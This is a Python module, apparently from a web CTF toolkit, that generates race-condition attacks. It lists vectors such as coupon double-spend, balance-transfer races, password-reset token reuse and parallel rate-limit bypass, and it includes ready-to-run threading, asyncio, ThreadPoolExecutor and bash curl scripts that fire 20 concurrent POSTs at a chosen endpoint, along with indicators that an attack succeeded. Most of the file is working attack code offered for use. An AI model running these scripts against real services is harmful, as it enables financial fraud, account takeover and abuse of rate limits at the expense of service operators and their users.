"""
Race Condition Payload Crafter for Web CTF.
Covers TOCTOU (Time-of-Check to Time-of-Use), concurrent request racing,
coupon/balance double-spend, and rate-limit bypass via parallel requests.
"""

from typing import List, Dict


def get_race_condition_vectors() -> List[Dict[str, str]]:
    """Generate race condition attack vectors and their descriptions."""
    return [
        {
            "name": "TOCTOU (Time-of-Check to Time-of-Use)",
            "payload": "Send N parallel requests that check a condition then act on it",
            "desc": "Exploits the gap between checking a condition (e.g. balance) and using it (e.g. transfer)."
        },
        {
            "name": "Double-Spend / Coupon Reuse",
            "payload": "Send multiple parallel requests to redeem the same coupon/balance",
            "desc": "Race condition allows redeeming the same coupon or balance multiple times."
        },
        {
            "name": "Account Balance Transfer Race",
            "payload": "Send parallel transfer requests before balance is updated",
            "desc": "Multiple transfers execute before the balance check completes."
        },
        {
            "name": "Signup / Registration Race",
            "payload": "Send parallel registration requests with same username",
            "desc": "Race condition may allow multiple accounts with the same username."
        },
        {
            "name": "Password Reset Race",
            "payload": "Send parallel password reset requests to reuse the same token",
            "desc": "Race condition may allow reusing the same reset token."
        },
        {
            "name": "Rate Limit Bypass (Parallel)",
            "payload": "Send N parallel requests to bypass per-request rate limiting",
            "desc": "Rate limits often count sequential requests, not parallel ones."
        },
        {
            "name": "Email Verification Race",
            "payload": "Send parallel requests to verify email before check completes",
            "desc": "Race condition may allow verifying an email that doesn't belong to you."
        },
        {
            "name": "File Upload Race (Symlink)",
            "payload": "Upload file and access it before validation completes",
            "desc": "Race condition between upload and validation allows accessing malicious file."
        }
    ]


def get_race_condition_payloads(endpoint: str = "/api/transfer",
                                param: str = "amount", value: str = "100") -> List[Dict[str, str]]:
    """Generate race condition payloads (concurrent request scripts)."""
    return [
        {
            "name": "Python Threading Race (N parallel requests)",
            "payload": f"""import threading
import requests

URL = "{endpoint}"
DATA = {{"{param}": "{value}"}}

def attack():
    try:
        r = requests.post(URL, data=DATA, timeout=5)
        print(f"Status: {{r.status_code}} - {{r.text[:100]}}")
    except Exception as e:
        print(f"Error: {{e}}")

# Fire 20 parallel requests
threads = [threading.Thread(target=attack) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()""",
            "desc": "Python threading script to fire N parallel requests for race condition testing."
        },
        {
            "name": "Python asyncio Race (concurrent)",
            "payload": f"""import asyncio
import aiohttp

URL = "{endpoint}"
DATA = {{"{param}": "{value}"}}

async def attack(session):
    async with session.post(URL, data=DATA) as r:
        text = await r.text()
        print(f"Status: {{r.status}} - {{text[:100]}}")

async def main():
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[attack(session) for _ in range(20)])

asyncio.run(main())""",
            "desc": "Python asyncio script for high-concurrency race condition testing."
        },
        {
            "name": "Bash Parallel Curl Race",
            "payload": f"""for i in $(seq 1 20); do
  curl -s -X POST "{endpoint}" -d "{param}={value}" &
done
wait""",
            "desc": "Bash script firing 20 parallel curl requests."
        },
        {
            "name": "Turbo Intruder Style (Python)",
            "payload": f"""import requests
from concurrent.futures import ThreadPoolExecutor

URL = "{endpoint}"
DATA = {{"{param}": "{value}"}}

def attack(_):
    try:
        r = requests.post(URL, data=DATA, timeout=5)
        return r.status_code, r.text[:100]
    except Exception as e:
        return None, str(e)

with ThreadPoolExecutor(max_workers=20) as pool:
    results = list(pool.map(attack, range(20)))
for status, text in results:
    print(f"Status: {{status}} - {{text}}")""",
            "desc": "ThreadPoolExecutor-based race condition script (Turbo Intruder style)."
        }
    ]


def get_race_condition_indicators() -> List[Dict[str, str]]:
    """Indicators that a race condition was successfully exploited."""
    return [
        {
            "indicator": "Multiple success responses",
            "desc": "More than one request returned success (e.g. 200 OK) for a single-use operation."
        },
        {
            "indicator": "Balance/coupon reused",
            "desc": "Balance or coupon was applied more than once."
        },
        {
            "indicator": "Duplicate accounts",
            "desc": "Multiple accounts created with the same username/email."
        },
        {
            "indicator": "Token reuse",
            "desc": "Same reset/verification token used multiple times."
        },
        {
            "indicator": "Inconsistent state",
            "desc": "Server state inconsistent with expected single-use semantics."
        }
    ]
